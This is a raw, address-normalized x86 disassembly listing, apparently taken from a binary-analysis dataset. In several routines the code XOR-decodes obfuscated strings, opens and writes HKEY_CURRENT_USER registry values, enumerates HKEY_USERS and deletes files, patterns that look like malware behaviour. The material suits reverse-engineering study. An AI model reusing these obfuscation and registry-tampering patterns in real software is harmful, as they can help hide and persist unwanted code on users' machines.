mov [ eax + 0xc ] edi
mov [ eax + 0x10 ] edi
mov [ eax + 0x14 ] edi
mov [ eax + 0x1c ] edi
mov [ eax + 0x20 ] edi
mov [ eax + 0x24 ] edi
jmp r-xdata
xor eax eax
mov [ ebp - 0x58 ] 0x7
mov [ ebp - 0x5c ] edi
mov [ ebp - 0x6c ] ax
cmp [ ebp - 0x90 ] esi
jb r-xdata
mov edx [ ebp - 0x6c ]
push edx
call sub_1000a86e
add esp 0x4
lea esi [ ebp - 0x60 ]
call sub_10029980
mov esi [ ebp - 0xa8 ]
mov ebx eax
mov [ ebp - 0x4 ] 0x3
call sub_10025940
mov [ ebp - 0x4 ] 0xffffffff
mov eax [ ebp - 0x60 ]
cmp eax edi
je r-xdata
lea edx [ ebp - 0x50 ]
mov eax 0xdc
call sub_10069020
xor eax eax
mov [ ebp - 0x6c ] ax
mov eax edx
mov [ ebp - 0x58 ] 0x7
mov [ ebp - 0x5c ] edi
lea edx [ eax + 0x2 ]
mov [ rw-data ] eax
call sub_1005f670
test eax eax
je r-xdata
mov eax 0x1
jmp r-xdata
mov ecx [ ebp - 0xa4 ]
push ecx
call sub_1000a86e
add esp 0x4
mov esi [ rw-data ]
mov [ ebp - 0x60 ] edi
mov [ ebp - 0x5c ] edi
mov [ ebp - 0x58 ] edi
cmp esi edi
je r-xdata
mov edi [ ebp - 0x5c ]
call sub_1006a100
mov eax [ ebp - 0x60 ]
push eax
call sub_1000a86e
add esp 0x4
xor edi edi
mov cx [ eax ]
add eax 0x2
cmp cx di
jne r-xdata
sub eax edx
sar eax 0x1
push eax
lea ecx [ ebp - 0x50 ]
push ecx
lea ecx [ ebp - 0x6c ]
call sub_10034100
lea edx [ ebp - 0x6c ]
mov ecx 0xf
mov [ ebp - 0x4 ] 0x2
call sub_10022b50
cmp [ ebp - 0x58 ] 0x8
jb r-xdata
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x10 ]
xor ecx ebp
call sub_10032529
mov esp ebp
pop ebp
retn 0x8
lea edx [ ebp - 0x64 ]
mov eax 0x5f
mov [ rw-data ] edi
call sub_10069020
mov eax [ ebp - 0xa8 ]
mov esi [ eax ]
cmp esi [ eax + 0x4 ]
je r-xdata
call sub_10051410
mov eax 0x2
jmp r-xdata
mov edx [ ebp - 0x6c ]
push edx
call sub_1000a86e
add esp 0x4
xor eax eax
jmp r-xdata
lea eax [ ebp - 0x64 ]
lea edx [ eax + 0x2 ]
jmp r-xdata
mov cx [ eax ]
add eax 0x2
cmp cx di
jne r-xdata
sub eax edx
sar eax 0x1
lea ecx [ ebp - 0x64 ]
push ecx
mov edi eax
mov eax [ esi + 0x10 ]
mov ecx esi
call sub_100449d0
test eax eax
je r-xdata
mov eax [ esi + 0x20 ]
mov esi [ esi + 0x1c ]
shr eax 0x1
xor ecx ecx
push eax
mov [ ebp - 0x88 ] cx
push esi
lea ecx [ ebp - 0x88 ]
mov [ ebp - 0x74 ] 0x7
mov [ ebp - 0x78 ] 0x0
call sub_10034100
mov ecx [ ebp - 0xb4 ]
lea edx [ ebp - 0x88 ]
push edx
mov [ ebp - 0x4 ] 0x4
call sub_10033f90
cmp [ ebp - 0x74 ] 0x8
jb r-xdata
mov edx [ ebp - 0xa8 ]
add esi 0x24
cmp esi [ edx + 0x4 ]
jne r-xdata
mov eax [ ebp - 0x88 ]
push eax
call sub_1000a86e
add esp 0x4
xor edi edi
jmp r-xdata
sub_1006acf0
push ebp
mov ebp esp
push ecx
push 0xffffffff
push 0x0
push eax
mov [ ebp - 0x4 ] 0x0
call sub_1006da10
xor ecx ecx
mov [ esi + 0x14 ] 0x7
mov [ esi + 0x10 ] 0x0
mov [ esi ] cx
push eax
mov ecx esi
call sub_10033f90
mov eax esi
mov esp ebp
pop ebp
retn
sub_1006ad40
push ebp
mov ebp esp
sub esp 0xf0
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov ecx [ r--data ]
xor eax eax
jmp r-xdata
movsx edx [ ecx + eax ]
xor edx eax
xor edx 0x75
and edx 0xff
mov [ ebp + eax * 2 - 0x8c ] dx
inc eax
cmp eax 0x29
jb r-xdata
push edi
mov edi [ RegOpenKeyExW@IAT ]
lea ecx [ ebp - 0xe4 ]
push ecx
push 0x1
xor eax eax
push eax
lea edx [ ebp - 0x8c ]
push edx
push 0x80000001
mov [ ebp - 0x3a ] ax
call edi
test eax eax
je r-xdata
lea edx [ ebp - 0x38 ]
mov eax 0xdf
mov [ ebp - 0xf0 ] 0x4
mov [ ebp - 0xe8 ] 0x0
call sub_10069020
lea eax [ ebp - 0xf0 ]
push eax
mov eax [ ebp - 0xe4 ]
lea ecx [ ebp - 0xe8 ]
push ecx
push 0x0
push 0x0
push edx
push eax
call [ RegQueryValueExW@IAT ]
test eax eax
jne r-xdata
mov eax 0x1
pop edi
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10032529
mov esp ebp
pop ebp
retn
mov edx [ ebp - 0xe4 ]
push esi
mov esi [ RegCloseKey@IAT ]
push edx
call esi
lea edx [ ebp - 0xe0 ]
mov eax 0x53
call sub_10069020
lea eax [ ebp - 0xe4 ]
push eax
push 0x2
push 0x0
mov ecx edx
push ecx
push 0x80000001
call edi
test eax eax
je r-xdata
mov eax [ ebp - 0xe8 ]
cmp eax 0x1
je r-xdata
mov ecx [ ebp - 0xe4 ]
push 0x4
lea edx [ ebp - 0xec ]
push edx
push 0x4
push 0x0
lea eax [ ebp - 0x38 ]
push eax
push ecx
mov [ ebp - 0xec ] 0x1
call [ RegSetValueExW@IAT ]
test eax eax
je r-xdata
pop esi
mov eax 0x2
pop edi
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10032529
mov esp ebp
pop ebp
retn
mov ecx [ ebp - 0xe4 ]
push ecx
call [ RegCloseKey@IAT ]
xor eax eax
pop edi
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10032529
mov esp ebp
pop ebp
retn
cmp eax 0x2
jne r-xdata
mov eax [ ebp - 0xe4 ]
push eax
call esi
mov ecx [ ebp - 0x4 ]
pop esi
xor ecx ebp
xor eax eax
pop edi
call sub_10032529
mov esp ebp
pop ebp
retn
mov edx [ ebp - 0xe4 ]
push edx
call esi
pop esi
mov eax 0x3
pop edi
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10032529
mov esp ebp
pop ebp
retn
sub_1006aee0
mov ecx [ eax ]
cmp [ ecx + 0x15 ] 0x0
je r-xdata
mov edx [ ecx ]
cmp [ edx + 0x15 ] 0x0
jne r-xdata
mov ecx [ ecx + 0x8 ]
mov [ eax ] ecx
retn
mov ecx [ ecx + 0x4 ]
cmp [ ecx + 0x15 ] 0x0
jne r-xdata
mov ecx [ edx + 0x8 ]
cmp [ ecx + 0x15 ] 0x0
jne r-xdata
mov edx [ eax ]
cmp [ edx + 0x15 ] 0x0
jne r-xdata
mov edx [ eax ]
cmp edx [ ecx ]
jne r-xdata
mov [ eax ] edx
retn
nop
retn
mov [ eax ] ecx
mov [ eax ] ecx
mov ecx [ ecx + 0x4 ]
cmp [ ecx + 0x15 ] 0x0
je r-xdata
mov edx ecx
mov ecx [ edx + 0x8 ]
cmp [ ecx + 0x15 ] 0x0
je r-xdata
sub_1006af40
push ebp
mov ebp esp
sub esp 0x224
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
push esi
push edi
lea eax [ ebp - 0x220 ]
push eax
push 0x8
push 0x0
push 0x0
push 0x80000003
call [ RegOpenKeyExW@IAT ]
test eax eax
jne r-xdata
pop edi
pop esi
xor eax eax
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10032529
mov esp ebp
pop ebp
retn
mov ebx [ RegEnumKeyExW@IAT ]
xor esi esi
mov edi edi
mov ecx [ ebp - 0x220 ]
push ecx
call [ RegCloseKey@IAT ]
lea eax [ ebp - 0x21c ]
push eax
call [ CharUpperW@IAT ]
mov ecx [ r--data ]
xor eax eax
lea esp [ esp ]
movsx edx [ ecx + eax ]
xor edx eax
xor edx 0x47
and edx 0xff
mov [ ebp + eax * 2 - 0x14 ] dx
inc eax
cmp eax 0x7
jb r-xdata
lea ecx [ ebp - 0x14 ]
push ecx
lea edx [ ebp - 0x21c ]
xor eax eax
push edx
mov [ ebp - 0x6 ] ax
call sub_1000b388
add esp 0x8
test eax eax
jne r-xdata
mov eax [ ebp - 0x220 ]
push eax
call [ RegCloseKey@IAT ]
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
mov eax 0x1
pop ebx
call sub_10032529
mov esp ebp
pop ebp
retn
inc esi
cmp esi 0x100
jl r-xdata
xor eax eax
movzx edx ax
push 0x0
push 0x0
mov eax edx
shl edx 0x10
push 0x0
or eax edx
mov edx [ ebp - 0x220 ]
push 0x0
mov ecx 0x82
lea edi [ ebp - 0x21c ]
[ edi ]
lea eax [ ebp - 0x224 ]
push eax
lea ecx [ ebp - 0x21c ]
push ecx
push esi
push edx
mov [ ebp - 0x224 ] 0x206
call ebx
test eax eax
jne r-xdata
sub_1006b070
push ebp
mov ebp esp
push ecx
push ebx
mov ebx [ ecx + 0x14 ]
push esi
mov esi eax
mov eax [ ecx + 0x10 ]
mov edx [ esi + 0x10 ]
sub ebx eax
mov [ ebp - 0x4 ] 0x0
cmp edx ebx
jbe r-xdata
push 0xffffffff
push 0x0
push esi
call sub_1006da10
xor edx edx
mov [ edi + 0x14 ] 0x7
mov [ edi + 0x10 ] 0x0
push eax
mov ecx edi
mov [ edi ] dx
call sub_10033f90
pop esi
mov eax edi
pop ebx
mov esp ebp
pop ebp
retn
mov ebx [ esi + 0x14 ]
sub ebx edx
cmp ebx eax
jb r-xdata
push 0x0
push ecx
or eax 0xffffffff
call sub_10063e80
xor ecx ecx
mov [ edi + 0x14 ] 0x7
mov [ edi + 0x10 ] 0x0
mov [ edi ] cx
push eax
mov ecx edi
call sub_10033f90
pop esi
mov eax edi
pop ebx
mov esp ebp
pop ebp
retn
sub_1006b0f2
push 0x14
mov eax sub_10085df6
call sub_10026266
push 0x0
lea ecx [ ebp - 0x14 ]
call sub_1000c927
mov esi [ rw-data ]
and [ ebp - 0x4 ] 0x0
mov ecx rw-data
mov [ ebp - 0x10 ] esi
call sub_1006ef60
mov ecx [ ebp + 0x8 ]
push eax
call sub_1005eec0
mov edi eax
test edi edi
jne r-xdata
or [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0x14 ]
call sub_10003c9c
mov eax edi
call sub_10008d33
retn
test esi esi
je r-xdata
push [ ebp + 0x8 ]
lea eax [ ebp - 0x10 ]
push eax
call sub_1000542c
pop ecx
pop ecx
cmp eax 0xffffffff
jne r-xdata
mov edi esi
jmp r-xdata
mov edi [ ebp - 0x10 ]
mov ecx edi
mov [ rw-data ] edi
call sub_10042890
push edi
call sub_10008715
pop ecx
push r--data
lea ecx [ ebp - 0x20 ]
call sub_100661c2
push r--data
lea eax [ ebp - 0x20 ]
push eax
call sub_10055e2a
sub_1006b190
push ebp
mov ebp esp
and esp 0xfffffff8
sub esp 0xc
push ebx
xor eax eax
push esi
push edi
mov ebx ecx
mov [ esp + 0x10 ] eax
mov [ esp + 0x14 ] eax
cmp [ ebp + 0x10 ] eax
jl r-xdata
mov eax [ esp + 0x10 ]
mov edx [ esp + 0x14 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0xc
jg r-xdata
mov ecx ebx
call sub_1001e9a0
mov edi edx
mov esi eax
test edi edi
jl r-xdata
cmp [ ebp + 0xc ] eax
jbe r-xdata
mov eax [ ebp + 0x8 ]
movzx eax [ eax ]
mov edx [ ebx ]
push eax
mov eax [ edx + 0xc ]
mov ecx ebx
call eax
or ecx 0xffffffff
cmp eax ecx
je r-xdata
jg r-xdata
lea esp [ esp ]
mov eax 0x1
add [ ebp + 0x8 ] eax
add [ esp + 0x10 ] eax
adc [ esp + 0x14 ] 0x0
add [ ebp + 0xc ] ecx
adc [ ebp + 0x10 ] ecx
mov eax [ ebp + 0x10 ]
cmp eax edi
jg r-xdata
test esi esi
je r-xdata
jl r-xdata
mov eax [ ebp + 0x8 ]
mov ecx [ ebx + 0x24 ]
mov edx [ ecx ]
push esi
push eax
push edx
call sub_1007f580
add [ ebp + 0x8 ] esi
mov eax [ ebx + 0x34 ]
add esp 0xc
add [ esp + 0x10 ] esi
adc [ esp + 0x14 ] edi
sub [ ebp + 0xc ] esi
sbb [ ebp + 0x10 ] edi
sub [ eax ] esi
mov eax [ ebx + 0x24 ]
add [ eax ] esi
jmp r-xdata
jl r-xdata
cmp [ ebp + 0xc ] 0x0
ja r-xdata
cmp [ ebp + 0x10 ] 0x0
jg r-xdata
mov esi [ ebp + 0xc ]
mov edi eax
cmp [ ebp + 0xc ] esi
jae r-xdata
sub_1006b26d
push 0x58
mov eax sub_1008520f
call sub_10047689
mov eax [ ebp + 0x14 ]
mov ebx [ ebp + 0xc ]
mov esi [ ebp + 0x10 ]
mov [ ebp - 0x5c ] eax
mov eax [ ebp + 0x1c ]
push eax
mov [ ebp - 0x64 ] ebx
call sub_10067ab7
mov edi eax
pop ecx
lea eax [ ebp - 0x48 ]
push eax
mov ecx edi
call sub_10026407
and [ ebp - 0x4 ] 0x0
cmp [ ebp - 0x38 ] 0x0
jne r-xdata
mov eax [ edi ]
mov ecx edi
call [ eax + 0x8 ]
mov [ ebp - 0x4a ] al
mov [ ebp - 0x4a ] 0x0
jmp r-xdata
mov eax [ ebp + 0x18 ]
and eax 0xe00
push 0xa
pop edi
cmp eax 0x400
jne r-xdata
cmp [ esi + 0x4 ] al
jne r-xdata
push [ ebp - 0x5c ]
mov ecx esi
mov [ ebp - 0x50 ] ebx
call sub_1006995b
test al al
jne r-xdata
cmp eax 0x800
jne r-xdata
mov [ ebp - 0x54 ] 0x8
jmp r-xdata
cmp [ esi + 0x5 ] 0x2b
jne r-xdata
mov ecx esi
call sub_1001f91c
neg eax
sbb eax eax
and eax edi
mov [ ebp - 0x54 ] eax
mov [ ebp - 0x54 ] 0x10
jmp r-xdata
push [ ebp - 0x5c ]
mov ecx esi
mov [ ebp - 0x58 ] 0x0
mov [ ebp - 0x49 ] 0x0
call sub_1006995b
test al al
jne r-xdata
cmp [ esi + 0x4 ] 0x0
jne r-xdata
mov [ ebx ] 0x2b
jmp r-xdata
cmp [ ebp - 0x54 ] 0x0
je r-xdata
cmp [ esi + 0x4 ] al
jne r-xdata
cmp [ esi + 0x5 ] 0x2d
jne r-xdata
mov ecx esi
call sub_1001f91c
lea eax [ ebx + 0x1 ]
mov ecx esi
mov [ ebp - 0x50 ] eax
call sub_1005f5ef
mov [ ebp - 0x60 ] edi
cmp [ ebp - 0x54 ] edi
je r-xdata
cmp [ esi + 0x5 ] 0x30
jne r-xdata
mov ecx esi
call sub_1001f91c
mov [ ebx ] 0x2d
cmp [ ebp - 0x34 ] 0x10
mov edx [ ebp - 0x48 ]
jae r-xdata
cmp [ esi + 0x4 ] 0x0
jne r-xdata
xor eax eax
cmp [ ebp - 0x54 ] 0x8
setne al
dec eax
and eax 0xfffffff2
add eax 0x16
mov [ ebp - 0x60 ] eax
jmp r-xdata
mov ecx esi
mov [ ebp - 0x58 ] 0x1
call sub_1005f5ef
push [ ebp - 0x5c ]
mov ecx esi
call sub_1006995b
test al al
jne r-xdata
cmp [ ebp - 0x58 ] 0x0
je r-xdata
lea edx [ ebp - 0x48 ]
mov al [ esi + 0x5 ]
mov ecx [ ebp - 0x50 ]
push [ ebp - 0x60 ]
mov [ ecx ] al
movsx eax al
push eax
push r--data
call sub_1007f310
add esp 0xc
test eax eax
je r-xdata
mov ecx esi
call sub_1001f91c
push [ ebp - 0x58 ]
and [ ebp - 0x1c ] 0x0
push 0x1
lea ecx [ ebp - 0x2c ]
mov [ ebp - 0x18 ] 0xf
mov [ ebp - 0x2c ] 0x0
call sub_10021130
push [ ebp - 0x5c ]
mov ecx esi
mov [ ebp - 0x4 ] 0x1
xor edi edi
add ebx 0x1f
call sub_1006995b
test al al
jne r-xdata
cmp [ ebp - 0x54 ] 0x0
jne r-xdata
cmp [ esi + 0x4 ] al
jne r-xdata
mov eax [ ebp - 0x64 ]
mov [ ebp - 0x50 ] eax
test edi edi
je r-xdata
cmp [ ebp - 0x18 ] 0x10
mov eax [ ebp - 0x2c ]
jae r-xdata
cmp [ ebp - 0x49 ] 0x0
jne r-xdata
mov [ ebp - 0x54 ] 0x8
cmp [ esi + 0x5 ] 0x78
je r-xdata
mov ecx esi
call sub_1001f91c
cmp [ ebp - 0x49 ] 0x0
jne r-xdata
mov cl [ edx ]
cmp cl 0x7f
je r-xdata
cmp [ eax + edi ] 0x0
je r-xdata
lea eax [ ebp - 0x2c ]
cmp [ ebp - 0x50 ] ebx
jae r-xdata
mov eax [ ebp - 0x50 ]
cmp [ eax ] 0x30
je r-xdata
cmp [ ebp - 0x54 ] 0x0
je r-xdata
cmp [ esi + 0x4 ] 0x0
jne r-xdata
mov eax [ ebp - 0x50 ]
push 0x0
push 0x1
lea ecx [ ebp - 0x2c ]
mov [ eax ] 0x0
call sub_10005b50
push 0x0
push 0x1
lea ecx [ ebp - 0x48 ]
call sub_10005b50
mov eax [ ebp - 0x54 ]
call sub_100262c3
retn
mov eax [ ebp - 0x50 ]
inc [ ebp - 0x50 ]
mov [ eax ] 0x30
jmp r-xdata
dec edi
je r-xdata
test edi edi
je r-xdata
cmp [ ebp - 0x4a ] 0x0
je r-xdata
cmp [ ebp - 0x18 ] 0x10
mov eax [ ebp - 0x2c ]
mov [ ebp - 0x58 ] 0x1
jae r-xdata
inc [ ebp - 0x50 ]
mov [ ebp - 0x49 ] 0x1
mov ecx esi
mov [ ebp - 0x54 ] 0x10
mov [ ebp - 0x58 ] 0x0
call sub_1005f5ef
jmp r-xdata
cmp [ ebp - 0x54 ] 0x10
jne r-xdata
cmp [ esi + 0x5 ] 0x58
jne r-xdata
mov ecx esi
call sub_1001f91c
test edi edi
jne r-xdata
cmp [ ebp - 0x18 ] 0x10
mov eax [ ebp - 0x2c ]
jae r-xdata
cmp [ ebp - 0x18 ] 0x10
mov eax [ ebp - 0x2c ]
jae r-xdata
cmp [ esi + 0x4 ] 0x0
jne r-xdata
cmp [ eax + edi ] 0x7f
je r-xdata
lea eax [ ebp - 0x2c ]
cmp [ edx + 0x1 ] 0x0
jle r-xdata
cmp [ ebp - 0x18 ] 0x10
mov eax [ ebp - 0x2c ]
jae r-xdata
cmp cl [ eax + edi ]
jne r-xdata
lea eax [ ebp - 0x2c ]
cmp [ eax + edi ] 0x0
jle r-xdata
lea eax [ ebp - 0x2c ]
mov al [ ebp - 0x4a ]
cmp [ esi + 0x5 ] al
jne r-xdata
mov ecx esi
call sub_1001f91c
mov ecx esi
call sub_1005f5ef
push [ ebp - 0x5c ]
mov ecx esi
call sub_1006995b
test al al
je r-xdata
cmp [ ebp - 0x18 ] 0x10
mov eax [ ebp - 0x2c ]
jae r-xdata
inc edx
jmp r-xdata
cmp cl [ eax ]
jl r-xdata
lea eax [ ebp - 0x2c ]
mov [ ebp - 0x58 ] 0x0
inc edi
jmp r-xdata
push 0x0
push 0x1
lea ecx [ ebp - 0x2c ]
call sub_10042a70
inc edi
inc [ eax + edi ]
jmp r-xdata
lea eax [ ebp - 0x2c ]
sub_1006b5a0
push ebp
mov ebp esp
push 0xffffffff
push sub_10087fd0
mov eax [ fs : 0x0 ]
push eax
sub esp 0x14
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x10 ] esp
mov edi [ ebp + 0x8 ]
xor esi esi
mov [ edi + 0x8 ] esi
mov [ edi + 0xc ] esi
mov eax [ edi ]
mov ecx [ eax + 0x4 ]
mov ecx [ ecx + edi + 0x38 ]
mov [ ebp - 0x14 ] esi
mov [ ebp - 0x1c ] edi
cmp ecx esi
je r-xdata
mov [ ebp - 0x4 ] esi
call sub_10032790
mov [ ebp - 0x18 ] al
mov [ ebp - 0x4 ] 0x1
test al al
je r-xdata
mov edx [ ecx ]
mov eax [ edx + 0x4 ]
call eax
mov edx [ edi ]
mov ecx [ edx + 0x4 ]
mov edx [ ebp - 0x14 ]
add ecx edi
cmp edx esi
je r-xdata
mov ebx [ ebp + 0x14 ]
mov esi [ ebp + 0x10 ]
mov [ ebp - 0x4 ] 0x2
mov ecx [ edi ]
mov edx [ ecx + 0x4 ]
mov ecx [ edx + edi + 0x38 ]
mov eax [ ecx ]
mov edx [ ebp + 0xc ]
mov eax [ eax + 0x20 ]
push ebx
push esi
push edx
call eax
add [ edi + 0x8 ] eax
mov ecx edx
adc [ edi + 0xc ] ecx
cmp eax esi
jne r-xdata
mov [ ebp - 0x4 ] 0xffffffff
mov eax [ edi ]
mov ecx [ eax + 0x4 ]
mov ecx [ ecx + edi + 0x38 ]
cmp ecx esi
je r-xdata
mov eax [ ecx + 0xc ]
or eax edx
cmp [ ecx + 0x38 ] esi
jne r-xdata
mov [ ebp - 0x14 ] 0x3
cmp ecx ebx
je r-xdata
mov eax edi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x10
mov edx [ ecx ]
mov eax [ edx + 0x8 ]
call eax
push esi
call sub_10039ae0
or eax 0x4
xor esi esi
mov [ ebp - 0x4 ] 0x1
jmp r-xdata
sub_1006b646
mov eax [ ebp + 0x8 ]
mov ecx [ eax ]
mov ecx [ ecx + 0x4 ]
add ecx eax
mov eax [ ecx + 0xc ]
or eax 0x4
cmp [ ecx + 0x38 ] 0x0
jne r-xdata
push 0x1
call sub_10039ae0
mov [ ebp - 0x4 ] 0x1
mov eax r-xdata
retn
or eax 0x4
sub_1006b6ca
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push ebx
push esi
lea eax [ ebp - 0x10 ]
push edi
push eax
mov ebx ecx
call sub_10005aeb
mov esi eax
lea edi [ ebx + 0x8 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop ecx
movsd [ edi ] [ esi ]
call sub_100575c5
pop edi
pop esi
mov [ ebx + 0x18 ] eax
mov [ ebx + 0x1c ] edx
pop ebx
leave
retn 0x4
sub_1006b700
push ebp
mov ebp esp
and esp 0xfffffff8
push 0xffffffff
push sub_1008a51f
mov eax [ fs : 0x0 ]
push eax
sub esp 0x3f0
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x3e8 ] eax
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0x400 ]
mov [ fs : 0x0 ] eax
mov ebx ecx
xor edi edi
mov [ esp + 0x14 ] ebx
cmp [ ebx + 0x8 ] edi
jne r-xdata
mov [ esp + 0x1c ] edi
mov [ esp + 0x20 ] edi
mov [ esp + 0x24 ] edi
mov [ esp + 0x408 ] edi
lea eax [ esp + 0xc8 ]
mov ecx ebx
lea esi [ esp + 0x34 ]
mov [ esp + 0x18 ] edi
mov [ esp + 0x2c ] edi
mov [ esp + 0xc8 ] edi
mov [ esp + 0xcc ] edi
mov [ esp + 0xd0 ] edi
call sub_10055e80
mov [ esp + 0x408 ] 0x1
mov esi [ esp + 0xc8 ]
cmp esi edi
je r-xdata
lea eax [ edi + 0x1 ]
jmp r-xdata
lea edx [ esp + 0x19c ]
mov eax 0x13b
call sub_10069020
mov eax edx
push eax
lea ecx [ esp + 0x94 ]
add ebx 0xc
push ecx
call sub_10029ef0
add esp 0x8
mov edx eax
mov ecx 0xa
mov [ esp + 0x408 ] 0x2
call sub_10022b50
mov [ esp + 0x408 ] 0x1
cmp [ esp + 0xa4 ] 0x8
jb r-xdata
mov eax [ esp + 0x14 ]
mov edx [ esp + 0xcc ]
push eax
lea ecx [ esp + 0xd8 ]
push ecx
push edx
push esi
call sub_1001feb0
push esi
call sub_1000a86e
add esp 0x14
mov ecx [ esp + 0x400 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ esp + 0x3e8 ]
xor ecx esp
call sub_10032529
mov esp ebp
pop ebp
retn
mov edx [ esp + 0x14 ]
lea eax [ esp + 0x18 ]
push eax
lea ecx [ esp + 0x38 ]
push ecx
lea ecx [ esp + 0x34 ]
lea edi [ esp + 0x24 ]
call sub_100017a0
test eax eax
je r-xdata
mov edx [ esp + 0x90 ]
push edx
call sub_1000a86e
add esp 0x4
mov eax [ esp + 0x2c ]
cmp eax 0x1e84800
jge r-xdata
lea edx [ esp + 0xf4 ]
mov eax 0x14a
call sub_10069020
push edx
lea eax [ esp + 0x94 ]
push eax
call sub_10029ef0
add esp 0x8
mov edx eax
mov ecx 0xa
mov [ esp + 0x408 ] 0x3
call sub_10022b50
cmp [ esp + 0xa4 ] 0x8
jb r-xdata
lea edx [ esp + 0x30 ]
mov eax 0x114
call sub_10069020
mov ecx edx
push ecx
mov ecx [ rw-data ]
push edx
mov eax edx
push eax
push 0x1
push 0x1
push ecx
lea eax [ esp + 0x204 ]
mov [ esp + 0x2c ] 0x1
call sub_1005bf30
test eax eax
jne r-xdata
mov edx [ esp + 0x18 ]
push 0x0
push eax
mov eax [ rw-data ]
push edx
push eax
xor edx edx
xor ecx ecx
call sub_10003660
test eax eax
je r-xdata
lea eax [ esp + 0x34 ]
mov [ esp + 0x408 ] 0x0
call sub_10054bf0
mov esi [ esp + 0x1c ]
test esi esi
je r-xdata
mov ecx [ esp + 0x90 ]
push ecx
call sub_1000a86e
add esp 0x4
mov eax [ esp + 0x18 ]
test eax eax
je r-xdata
mov edx [ esp + 0x2c ]
mov eax [ esp + 0x18 ]
push edx
push eax
lea eax [ esp + 0x1f4 ]
call sub_1002f360
add esp 0x8
mov [ esp + 0x14 ] eax
mov eax [ esp + 0x18 ]
test eax eax
je r-xdata
lea edx [ esp + 0xf4 ]
mov eax 0x99
call sub_10069020
mov ecx edx
push ecx
lea edx [ esp + 0xb0 ]
push edx
call sub_10029ef0
add esp 0x8
mov edx eax
mov ecx 0xa
mov [ esp + 0x408 ] 0x4
call sub_10022b50
lea ecx [ esp + 0xac ]
call sub_100702e0
lea eax [ esp + 0x34 ]
mov [ esp + 0x408 ] 0x0
call sub_10054bf0
lea esi [ esp + 0x1c ]
call sub_10030710
mov eax 0x3
jmp r-xdata
mov eax 0x2
jmp r-xdata
mov edi [ esp + 0x20 ]
mov eax esi
call sub_1006a100
push esi
call sub_1000a86e
add esp 0x4
mov esi [ esp + 0x1c ]
mov edi [ esp + 0x20 ]
cmp esi edi
je r-xdata
push eax
push 0x0
call [ GetProcessHeap@IAT ]
push eax
call [ HeapFree@IAT ]
mov edi [ esp + 0x1c ]
mov esi [ esp + 0x20 ]
cmp edi esi
je r-xdata
push eax
push 0x0
call [ GetProcessHeap@IAT ]
push eax
call [ HeapFree@IAT ]
mov esi [ esp + 0x14 ]
test esi esi
je r-xdata
mov edi edi
lea edx [ esp + 0xc8 ]
mov eax 0xf0
call sub_10069020
mov ecx edx
push ecx
lea edx [ esp + 0x94 ]
push edx
call sub_10029ef0
add esp 0x8
mov edx eax
mov ecx 0xa
mov [ esp + 0x408 ] 0x5
call sub_10022b50
cmp [ esp + 0xa4 ] 0x8
jb r-xdata
jmp r-xdata
lea eax [ esp + 0x1ec ]
push eax
call sub_10050cb0
mov esi eax
test esi esi
je r-xdata
lea edx [ esp + 0xf4 ]
mov eax 0x99
call sub_10069020
push esi
lea esi [ esp + 0xb0 ]
call sub_1001ddf0
add esp 0x4
mov esi eax
lea edx [ esp + 0xf4 ]
push edx
lea eax [ esp + 0x94 ]
push eax
mov [ esp + 0x410 ] 0x6
call sub_10029ef0
add esp 0x8
mov ecx eax
mov eax esi
lea edi [ esp + 0xc8 ]
mov [ esp + 0x408 ] 0x7
call sub_1006b070
mov ebx 0x8
mov edx eax
lea ecx [ ebx + 0x2 ]
mov [ esp + 0x408 ] bl
call sub_10022b50
cmp [ esp + 0xdc ] ebx
jb r-xdata
mov ecx [ esi + 0x1c ]
push ecx
push 0x0
call [ GetProcessHeap@IAT ]
push eax
call [ HeapFree@IAT ]
add esi 0x24
cmp esi edi
jne r-xdata
lea eax [ esp + 0x34 ]
mov [ esp + 0x408 ] 0x0
call sub_10054bf0
mov ebx [ esp + 0x1c ]
test ebx ebx
je r-xdata
mov eax [ esp + 0x90 ]
push eax
call sub_1000a86e
add esp 0x4
jmp r-xdata
mov eax [ edi + 0x1c ]
push eax
push 0x0
call [ GetProcessHeap@IAT ]
push eax
call [ HeapFree@IAT ]
add edi 0x24
cmp edi esi
jne r-xdata
lea eax [ esp + 0x1ec ]
push eax
call [ DeleteFileW@IAT ]
lea edx [ esp + 0x170 ]
mov eax 0xf0
call sub_10069020
mov ecx edx
push ecx
lea edx [ esp + 0xb0 ]
push edx
call sub_10029ef0
add esp 0x8
mov edx eax
mov ecx 0xa
mov [ esp + 0x408 ] 0xc
call sub_10022b50
cmp [ esp + 0xc0 ] 0x8
jb r-xdata
lea ecx [ esp + 0x1ec ]
push ecx
call [ DeleteFileW@IAT ]
lea edx [ esp + 0xf4 ]
mov eax 0x99
call sub_10069020
push esi
lea esi [ esp + 0xb0 ]
call sub_1001ddf0
add esp 0x4
mov esi eax
lea edx [ esp + 0xf4 ]
push edx
lea eax [ esp + 0xcc ]
push eax
mov [ esp + 0x410 ] 0x9
call sub_10029ef0
add esp 0x8
mov ecx eax
mov eax esi
lea edi [ esp + 0x90 ]
mov [ esp + 0x408 ] 0xa
call sub_1006b070
mov edx eax
mov ecx 0xa
mov [ esp + 0x408 ] 0xb
call sub_10022b50
